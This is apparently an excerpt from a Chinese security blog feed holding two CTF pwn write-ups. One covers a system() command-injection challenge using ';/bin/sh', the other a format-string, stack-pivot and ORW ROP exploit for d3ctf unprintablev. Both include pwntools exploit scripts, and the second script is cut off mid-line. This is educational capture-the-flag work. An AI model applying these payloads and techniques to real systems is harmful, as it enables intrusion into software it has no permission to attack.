        <content type="html"><![CDATA[<h2 id="总结：">总结：</h2><p>通过这道题的学习与收获有：</p><p>1、分析这种漏洞比较明显的题目，应该倒推程序逻辑，而且程序最后给出了system(command)，而command又是个地址（指向我们所输入的内容），此时应该很容易想到，我们输入/bin/sh就可以执行。但是我开始没有想到这一点… 还是做的少。</p><p>2、考察了linux下命令行多命令执行的特定。如果命令被;分开，即使前面的命令执行错误也依旧会执行后面的命令。</p><p>3、u32可以一次转四个字符为对应ASCII码，返回值为int类型。</p><p>4、当格式化字符为%d时，我们想存入字符串，应该输入对应其ASCII。</p><p>5、这道题又是地址又是*地址的，开始容易搞迷糊，应该仔细捋一下。</p><h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220414222751499-1552697268.png" alt=""></p><h2 id="程序分析-大致思路：">程序分析&amp;&amp;大致思路：</h2><p><img src="../img/2706180-20220414222803646-96290051.png" alt=""></p><p>倒着分析一下，如果程序要执行system(command)就不能进入最后的一个if。也就是说最后的*v8要为0。并且command还要为/bin/sh参数或者sh参数。</p><p><img src="../img/2706180-20220414222812908-594360044.png" alt=""></p><p>这道题搜到了sh，然后思路就彻底跑偏了。因为我一直在考虑怎么对抗PIE保护（因为开了PIE之后，这个sh地址是没法直接用的），想对抗PIE的话，首先想到的就是泄露程序泄露基地址，不过这道题打印函数是不可能去泄露的，同时我们也没法溢出，不可能控制返回地址，因此泄露基地址这个方向绝对行不通。</p><p><em><strong>（这里当时想的就不对，command本身就是个地址，而我们输入的内容是存放到了command指向的位置，因此给system的command本身就是个指针了，所以就不可能再写sh的地址了）</strong></em></p><p>这道题依然需要倒着分析，先看这一部分。</p><p><img src="../img/2706180-20220414222829571-1571083575.png" alt=""></p><p>因为*v8最后肯定是要为0的，这个定死了。可是我们是控制不了*v8的值，不过这里分析一下这个循环。什么时候*v8可以为0？我们发现每次循环v8都会++，因此只有当*v8指向字符串末尾的时候，它的值才为0。因此我们肯定是要让这个for执行完毕。</p><p>再观察一下这个for循环整体，i和v7拿到的都是command（输入内容最开始的地址），每次循环先判断*v8是否为0（如果为0的话就会触发break结束掉循环（不过我们分析过了，只有在*v8到达字符串末尾的时候才会为0,因此这里不用考虑这个break））</p><p>第二个if，每次的v7都不能和*v8的值相同（如果相同，就会提前break掉导致*v8不为0)，而v7将循环遍历command[0]开始的每一个内存单元，而我们是可以控制每个内存单元的值的，接下来分析另一个部分。</p><p><img src="../img/2706180-20220414222839211-1406784564.png" alt=""></p><p>v4和v3还有v6都是command。然后输入的内容（必须是int型，如果是char类型程序将直接结束）将存放到command中，只要v4不是command+80就继续进行循环，也就是进行20次循环。由于每次v4+4并且又赋给v6，因此v6也在移动，也就是说我们输入的内容会依次存到command~command+80的位置。</p><p>然后进入第二个循环，这个循环很简单，就是v3去从command开始遍历，将每个内存单元的值都加上114514，等到v3为4100的时候，就可以出来这个循环了（v3将最后超过了我们可控制的command+80,不过仔细想一下，这并不影响，对么？</p><h2 id="执行system时的小坑">执行system时的小坑</h2><p>至此通过了所有的检查，可以执行system(command)，command前面是需要输入PvvN| 1S S0 GREAT!</p><p>这里有个坑<br><img src="../img/2706180-20220414222849824-873591426.png" alt=""><br><img src="../img/2706180-20220414222858876-343648094.png" alt=""></p><p>内容在这里。</p><p>然后PvvN| 1S S0 GREAT!的后面是我们要输入的命令，这里考察了linux系统命令行多命令执行的特点。</p><blockquote><p>Linux 系统可以在一个命令行上执行多个命令:<br>; --如果命令被分号(;)所分隔，那么命令会连续的执行下去，就算是错误的命令也会继续执行后面的命令<br>&amp;&amp; --如果命令被 &amp;&amp; 所分隔，那么命令也会一直执行下去，但是中间有错误的命令就不会执行后面的命令，没错就继续执行直至命令执行完为止<br>|| --如果命令被双竖线 || 所分隔，那么一遇到可以执行成功的命令就会停止执行后面的命令，而不管后面的命令是否正确。如果执行到错误的命令就是继续执行后一个命令，直到遇到执行到正确的命令或命令执行完为止</p></blockquote><p>此处转自<a href="https://blog.csdn.net/weixin_45582916/article/details/122519353">(27条消息) PWN-PRACTICE-CTFSHOW-4_P1umH0的博客-CSDN博客</a></p><p>因为我们前面输入的内容会被当做命令执行，它肯定是错误的，因此我们紧接着需要用;来连接后面的参数/bin/sh（sh也是可以的）</p><p><strong>因为我们只能输入整数，因此我们输入是以ASCII码的形式将字符输入进去的。</strong></p><h2 id="EXP：">EXP：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27224</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">flag=<span class="string">&quot;PvvN| 1S S0 GREAT!;/bin/sh\x00\x00&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    a=i*<span class="number">4</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(u32(flag[a:a+<span class="number">4</span>])-<span class="number">114514</span>))<span class="comment">#因为当时*v3加了114514,因此这里要减去，才能存入我们想要的值</span></span><br><span class="line">    <span class="comment">#因为一个内存单元只能存四个字节，因此一次发送四个字节过去，用u32将字符转换成对应的ASCII码（u32返回值为int类型，同时u32正好需要四个参数）</span></span><br><span class="line">    <span class="comment">#这道题也可以用chr来转换，不过就是比较麻烦，也算知道了u32的新用法</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220414222953526-1719545982.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_d3ctf_2019_unprintablev</title>
      <link href="/posts/7d36ed0c.html"/>
      <url>/posts/7d36ed0c.html</url>
      
        <content type="html"><![CDATA[<p># 总结：</p><p>通过这道题的学习与收获有：</p><p>1、close 关闭了标准输出时，可以用格式化字符串漏洞来将stdout指向的内容修改成IO_2_1_stderr，让程序重新有回显，关于这个过程我画了张图方便自己理解。</p><p><img src="../img/2706180-20220429212145573-1531060697.png" alt=""></p><p>2、已经拿到libc基地址的时候，我们所需要的gadget就可以直接去libc中拿，libc里啥都有，libc里啥都有，libc里啥都有，重要的事情说三遍！</p><p>3、写爆破脚本时，感觉会报错的地方，用try和except预判一手，让程序得以继续重新运行，而不是原地崩溃。</p><p>4、如果close(1)关闭了标准输出，那么格式化字符串漏洞的写入数据最多只能写入0x2000字节，程序如果执行了setvbuf，stdout会出现在bss段，反之则会在libc库中。</p><h1>保护策略：</h1><p><img src="../img/2706180-20220429212201826-1274587087.png" alt=""></p><p><img src="../img/2706180-20220429212210885-1992629980.png" alt=""></p><h1>程序分析：</h1><p><img src="../img/2706180-20220429212233284-421994592.png" alt=""></p><p><img src="../img/2706180-20220429212243902-940490318.png" alt=""></p><p>程序分析起来完全没压力，就是开了个沙箱，然后关闭了标准输出，然后循环100次格式化字符串漏洞（如果输入d^3CTF则会直接退出程序），数据是输入到了bss段。另外就是保护开了PIE</p><p>这道题可以说是de1ctf_2019_unprintable这道的强化版（因为某些方面这道题更简单），如果你现在在做本题并且没有做过unprintable这道题的话，建议先去做<a href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>这道题。</p><p>其实要说强化也不至于，这俩的区别就是一个是GetShell，一个是orw。前面的手法还是差不多的，ok，下面来分析一下这道题</p><h1>大致思路：</h1><p>首先这道题可以利用一百次的格式化字符串漏洞，这个相比于de1ctf_2019_unprintable的话是简单很多的。因为开了沙箱，那就考虑orw。有了unprintable这道题的经验，就很容易想到这道个题的思路也是将rop链布置到bss，然后将栈迁移到bss段即可。</p><p>然后就是最不好想的点，close(1)怎么处理？如果我们可以获取shell的话，可以将文件描述符重定位一下，用socket+connect也可以对抗close(1)（具体参考<a href="https://www.cnblogs.com/ZIKH26/articles/16193814.html">这篇文章</a>)）但是对于这道题而言都行不通，如果不能搞定这个close(1)，libc基地址和程序地址都无法泄露，那啥都没有还做个锤子…</p><p>在此学习到了一种新的手法来处理close(1)</p><blockquote><p>程序中的stdout（它是个指针）只是相当于一个跳板的作用（目的是去libc中寻IO_2_1_stdout地址），而IO_2_1_stdout所使用文件描述符1，close(1)关闭的是文件描述符1，但是程序中想要进行输出，并不是去直接跟文件描述符相接触，而是通过stdout来去访问到文件描述符(事实上它访问的是IO_2_1_stdout这个结构，而这个结构使用了文件描述符），举个例子，即使文件描述符1被关闭，但是<strong>执行puts的时候，程序是不知道文件描述符被关闭了，因此它依然会通过stdout来去寻找IO_2_1_stdout</strong>（以获取文件描述符1），<strong>等找到IO_2_1_stdout，程序才意识到文件描述符1被关闭，因此并不会让puts出现任何回显</strong>。</p><p>但是如果我们可以在这个过程的中间做手脚比如将原本stdout所指向的IO_2_1_stdout修改为IO_2_1_stderr，等程序来寻找的时候，最终获取了文件描述符2，由于文件描述符2对应的终端也是屏幕，最终执行puts成功出现了回显。</p></blockquote><p>PS:<strong>程序如果执行setvbuf，stdout会出现在bss段，反之则会在libc库中</strong>。</p><p>因此当前思路就是利用格式化字符串将stdout所指向的IO_2_1_stdout修改为IO_2_1_stderr，让程序出现回显。（另外就是一个大坑，<strong>如果close(1)关闭了标准输出，那么格式化字符串漏洞的写入数据最多只能写入0x2000字节</strong>（本菜狗通过实验仅仅只发现了这个规律，目前还不知道原因，如果各位师傅知道原因的话，还请告知）</p><h2 id="重启输出">重启输出</h2><p>由于输入是在bss段上，要是想修改栈中的数据，就要去布置一条栈链（关于栈链本文不再多说，具体可以去看<a href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>这篇文章）</p><p>然后通过栈链来修改数据。</p><h3 id="布置栈链">布置栈链</h3><p><img src="../img/2706180-20220429212323223-1540543285.png" alt=""></p><p>首先发现栈中存在bss段上buf的地址<font color=red>（<strong>请注意区分buf的地址，和指向buf的地址）</strong></font>，因此我们要把0x7fffffffdf58布置到栈里面，通过0x7fffffffdf58来改写0x555555756060,将其改写为stdout的地址，然后通过stdout的地址来修改libc中IO_2_1_stdout。</p><p>发现这里有一条栈链（如下图），那么我们拿它来开刀</p><p><img src="../img/2706180-20220429211303720-552527412.png" alt="image-20220429120543301"></p><p>这个偏移是6，因此第一次输入payload为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(leak) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br></pre></td></tr></table></figure><p>leak为程序自己泄露的地址取最后一字节，通过调试发现程序自己泄露的地址就是<strong>指向buf的地址</strong>，而我们现在就是要利用栈链把<strong>指向buf的地址</strong>写到栈里。</p><p>下图为修改前：</p><p><img src="../img/2706180-20220429211303321-1767973157.png" alt="image-20220429120948542"></p><p>下图为修改后：</p><p><img src="../img/2706180-20220429211302412-550468177.png" alt="image-20220429121046146"></p><p>下一步，通过指向buf的地址来修改buf地址，将其修改为stdout的值，也就是通过下图来进行修改</p><p><img src="../img/2706180-20220429211301712-926818635.png" alt="image-20220429131219657"></p><p>由图可知，偏移取10（考虑六个寄存器），payload如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x20</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span></span><br></pre></td></tr></table></figure><p>修改前：</p><p><img src="../img/2706180-20220429212347424-250445275.png" alt=""></p><p>修改后：</p><p><img src="../img/2706180-20220429211301359-1998268975.png" alt="image-20220429131503421"></p><p>此时buf已经被修改成了stdout的值，可以看到stdout指向了IO_2_1_stdout。</p><h3 id="修改IO-2-1-stdout">修改IO_2_1_stdout</h3><p>最后通过stdout将IO_2_1_stdout改为IO_2_1_stderr即可。</p><p>IO_2_1_stderr的偏移去libc中找（如下图），由于最后偏移只是最后一个半字节不同，但是利用格式化字符串要么修改一字节要么修改两字节，因此这里我们采用修改后两字节，即爆破倒数第四位（我们采用hn写入，但是对偏移取&amp;0xfff，因此我们一直在爆破成功的条件就是libc基地址倒数第四位为0时）</p><p><img src="../img/2706180-20220429211300471-55201055.png" alt="image-20220429132536061"></p><p>这里的payload为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stderr) + <span class="string">&#x27;c%9$hn&#x27;</span></span><br></pre></td></tr></table></figure><p>stderr为IO_2_1_stderr地址最后三位</p><p>由于这里是需要爆破的，如果爆破不成功就意味着修改失败，则程序依然不会给回显，因此我们通过程序是否有回显来判断,如果有回显的话，我们发过去的aaaaa肯定是可以被接收的，否则则返回当前函数，继续爆破。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendline(<span class="string">&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">    x = p.recvuntil(<span class="string">&#x27;aa&#x27;</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;fail&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success-----------------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure><p>下面为爆破成功修改stdout的情况，可以看到此时的stdout已经指向了IO_2_1_stderr</p><p><img src="../img/2706180-20220429211259662-1580436394.png" alt="image-20220429135139870"></p><p>至此我们的输出已经被重启，那剩下的就随便玩了。</p><h2 id="泄露数据">泄露数据</h2><p>由于接下来要对抗PIE以及要获取libc，因此我们要先泄露一下栈中数据。我们要获取栈基地址，libc基地址，程序基地址，观察栈里情况（如下图）</p><p><img src="../img/2706180-20220429212431241-1139249530.png" alt=""></p><p>如果此时直接发送payload会发现后门的数据都连包了，如果每次sendline之前都打上pause()，那么在格式化字符串执行的时候要你把所有的sendline全发了才能去执行，如果全发的话会连包… （这里补充一个很细的技巧，每次发送数据时，把payload给填满，这样就可以避免连包的产生），payload如下。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%19$p%15$p%6$p&#x27;</span></span><br><span class="line">p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="修改返回地址">修改返回地址</h2><p>因为最后的核心是在bss段布置rop链，因此我们需要把栈给迁移到bss段。大致思路是将返回地址改写成pop rsp地址，而把返回地址下面的内容改成要迁移的bss段地址，最后执行pop rsp的时候就完成了迁移，最终执行我们布置在bss段上rop链。</p><p>先说修改返回地址。</p><p><img src="../img/2706180-20220429211258718-1324186526.png" alt="image-20220429145805076"></p><p>只需要拿pop rsp的地址加上程序基地址的偏移，然后取后两字节就ok了。不过通过观察当前栈发现，依旧是需要栈链来修改返回地址，因为没有栈的内容指向了返回地址（如下图）</p><p><img src="../img/2706180-20220429211258315-666625238.png" alt="image-20220429200013595"></p><p>将栈顶内存单元指向的0x7ffe8cfa5578改成0x7ffe8cfa5588（如下图），这步的目的是通过0x7ffe8cfa5588来修改menu的返回地址。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(hook1) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p>修改后：</p><p><img src="../img/2706180-20220429211257019-882261517.png" alt="image-20220429184528636"></p><p>然后将menu函数的返回地址修改成pop rsp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(rsp_addr) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure><p>下图为修改后：</p><p><img src="../img/2706180-20220429211254572-26405026.png" alt="image-20220429201250680"></p><p>此时返回地址已经修改完成，最后两步分别是布置迁移地址和构造rop链，先说布置迁移地址。</p><h2 id="布置迁移地址">布置迁移地址</h2><p>这个过程和<a href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>一模一样（原理在这篇文章中已经解释），就不再解释原理了，直接放这部分脚本了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 布置迁移地址bss_addr+0x10  因为bss要存放d^3CTF and flag</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss_hook1-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_addr = base_addr + <span class="number">0x202060</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss1_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>(bss_addr &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_addr + <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook2--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    bss_hook = bss_hook + <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;bss_hook3--------------&gt;&#x27;</span>, <span class="built_in">hex</span>(bss_hook))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((bss_hook &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bss2_addr-------------&gt;&quot;</span>, <span class="built_in">hex</span>((bss_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((bss_addr) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%10$hn&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="布置rop链">布置rop链</h2><p>首先要触发pop rsp，肯定是要结束循环，因此我们输入的payload最开始要存放字符串d^3CTF，同时我们要采用orw，open的flag字符串也要存入。所以d^3CTF后面再写个flag字符串。又因为最开始的pop rsp后面还有pop r13;pop r14;pop r15，因此在字符串后面填入24字节的垃圾数据（为了避免将字符串弹入寄存器，我们迁移的地址垫高0x10字节）</p><p>至此开始正式布置rop链，这里说一下，我最开始用的是mprotect函数改写bss段属性，最后本地获取了flag，但是远程没有显示flag（但是脚本写的是没问题的，远程不通是个未解之谜…这个脚本我放到文末了）</p><p>mprotect行不通，那就采用传统方式，传参然后执行函数。</p><p>我们接下来就是要执行下面的内容，值得一提的是由于close关闭了文件描述符1，因此open返回的文件描述符是1（文件描述符是取当前可用文件描述符的最小的那一个，此时0,2被占用，因此1是最小），同时由于stdout指向了IO_2_1_stderr,所以我们应该使用文件描述符2进行输出。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(flag_addr,<span class="number">0</span>)</span><br><span class="line">read(<span class="number">1</span>,base_addr+<span class="number">0x202060</span>+<span class="number">0x300</span>,<span class="number">0x100</span>)</span><br><span class="line">write(<span class="number">2</span>,base_addr+<span class="number">0x202060</span>+<span class="number">0x300</span>,<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure><p>至于传参之类所需要的gadget，用啥就去libc库里找（因为现在libc基地址是知道的），libc里啥都有。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;d^3CTF\x00\x00&#x27;</span></span><br><span class="line">   payload += <span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">   payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   <span class="comment"># open(flag_addr,0)</span></span><br><span class="line">   payload += p64(pop_rdi_addr) + p64(base_addr + <span class="number">0x202068</span>)</span><br><span class="line">   payload += p64(pop_rsi_r15_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   payload += p64(open_addr)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># read(1,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">   payload += p64(pop_rdi_addr) + p64(<span class="number">1</span>)</span><br><span class="line">   payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">   payload += p64(read_addr)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># write(2,base_addr+0x202060+0x300,0x100)</span></span><br><span class="line">   payload += p64(pop_rdi_addr) + p64(<span class="number">2</span>)</span><br><span class="line">   payload += p64(pop_rsi_r15_addr) + p64(base_addr + <span class="number">0x202060</span> + <span class="number">0x300</span>) + p64(<span class="number">0</span>)</span><br><span class="line">   payload += p64(pop_rdx_addr) + p64(<span class="number">0x100</span>)</span><br><span class="line">   payload += p64(write_addr)</span><br><span class="line">   p.sendline(payload)</span><br><span class="line">   p.interactive()</span><br></pre></td></tr></table></figure><h1>exp：</h1><h2 id="1、获取libc基地址，用libc库里的gadget执行orw获取flag">1、获取libc基地址，用libc库里的gadget执行orw获取flag</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># from pwncli import *</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    io_stderr_addr = libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;io_stderr_addr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(io_stderr_addr))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">    print_ret_addr = leak_addr - <span class="number">0x20</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;print_ret_addr--------&gt;&#x27;</span>, <span class="built_in">hex</span>(print_ret_addr))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;构造栈链，第一次构造一个指向buf的栈地址&#x27;&#x27;&#x27;</span></span><br><span class="line">    leak = (leak_addr) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(leak) + <span class="string">&#x27;c%6$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    rsp_addr = <span class="number">0xbbd</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;第二次通过指向buf的栈地址，将buf修改为stdout&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x20</span>) + <span class="string">&#x27;c%10$hhn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;第三次通过stdout将_IO_2_1_stdout_改成_IO_2_1_stderr_值，此时需要爆破倒数第二字节的前半字节，猜测为0，概率1/16&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    stderr = io_stderr_addr &amp; <span class="number">0xfff</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;stderr------------&gt;&#x27;</span>, <span class="built_in">hex</span>(stderr))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(stderr) + <span class="string">&#x27;c%9$hn&#x27;</span></span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;下面来判断是否将stdout指向的值改写成stderr指向的值&#x27;&#x27;&#x27;</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        x = p.recvuntil(<span class="string">&#x27;aa&#x27;</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;aa&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> x:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;XXXXXX&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success-----------------------------------------&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    payload = <span class="string">&#x27;%19$p%15$p%6$p&#x27;</span></span><br><span class="line">    p.sendline(payload.ljust(<span class="number">0x12c</span> - <span class="number">1</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">    main_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># main_addr=u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main_addr----------&gt;&#x27;</span>, <span class="built_in">hex</span>(main_addr))</span><br><span class="line">    base_addr = main_addr - <span class="number">0xb24</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;base_addr----------&gt;&#x27;</span>, <span 